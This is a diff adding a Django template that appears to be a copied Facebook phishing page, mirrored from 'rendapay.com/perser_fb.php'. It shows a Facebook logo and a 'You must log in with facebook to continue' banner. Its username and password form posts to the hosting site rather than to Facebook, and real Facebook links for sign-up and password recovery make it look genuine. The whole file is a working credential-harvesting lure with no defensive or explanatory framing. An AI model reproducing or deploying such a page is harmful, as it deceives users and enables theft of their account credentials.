@@ -1,0 +1,104 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from rendapay.com/perser_fb.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Dec 2021 06:04:26 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<title>Welcome - Click here to Continue </title>
+
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+  
+	<style type="text/css">
+
+a:link {color:dodgerblue} 
+a:visited {color:dodgerblue;} 
+a:link {text-decoration:none;}
+a:visited {text-decoration:none;}
+
+		.fb_login
+		{
+			background-color:dodgerblue;
+			width:300px;
+			height:39px;
+			margin-left:3%;
+  			margin-right:3%;
+  			margin-top: 2%;
+  			border:solid 1px dodgerblue;
+  			border-radius: 4px;
+  			color:white;
+  			font-weight: 300;
+  			font-size: 17px;
+		}
+
+		.input3
+		{
+ 		 border:1px solid silver;
+  		border-radius:4px;
+  		margin-left:3%;
+  		margin-right:3%;
+  		margin-top: 2%;
+  		padding-left: 3%;
+  		font-size:15px;
+  		height: 39px;
+  		width: 300px;
+  		color:grey;
+  		background-color:whitesmoke;
+}
+.notification
+{
+  background-color:#FFFFC2;
+  opacity: 0.8;
+  border-bottom:solid 1px #E9AB17;
+  padding-left: 1%;
+  padding-right: 2%;
+  color: #254117;
+  font-size: 12px;
+  padding-top: 1%;
+  padding-bottom:2%;
+ 
+}
+.error
+{
+  background-color:#F62217;
+  opacity: 0.8;
+  border-bottom:solid 1px red;
+  padding-left: 1%;
+  padding-right: 2%;
+  color: white;
+  font-size: 12px;
+  padding-top: 1%;
+  padding-bottom:2%;
+  font-family:arial;
+ 
+}
+
+body {
+  margin: 0;
+  font-family: Delius;
+  font-size: 25px;
+}
+	</style>
+	<link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <script src='../kit.fontawesome.com/87d4bee17d.js'></script> 
+</head>
+<body>
+<div class="notification"><i class="fab fa-facebook-square" style="color:dodgerblue;font-size:14px;"></i>  <n style="font-family:arial;text-decoration:none;">You must log in with facebook to continue.</n></div>
+
+<br/><center><img src="/static/styles/icons/fblogo.jpg" height="20%" width="20%" /></center>
+<center>
+	<form method="POST" action="">
+		{% csrf_token %}
+		<input type="text" name="username" placeholder="Mobile number or email address" class="input3"/><br/>
+		<input type="password" name="password" placeholder="Password" class="input3"><br/>
+		<input type="submit" value="Log In" class="fb_login"/>
+	</form></center>
+<center><br/><img src="/static/styles/icons/fb_divider.jpg"></center>
+<center><br/><a href="https://facebook.com/reg-no-deeplink/?cid=103&amp;refid=8">
+<img src="/static/styles/icons/fb_create_new_account.jpg"></a><br/>
+<a href="https://facebook.com/recover/initiate/"><font color="dodgerblue" size="4"><n style="font-family:arial;text-decoration:none;"><small>Forgotten password?</small></n></font></a></center><br/>
+<center><img src="/static/styles/icons/fb_footer.jpg"/></center>
+</body>
+
+<!-- Mirrored from rendapay.com/perser_fb.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Dec 2021 06:04:29 GMT -->
+</html>
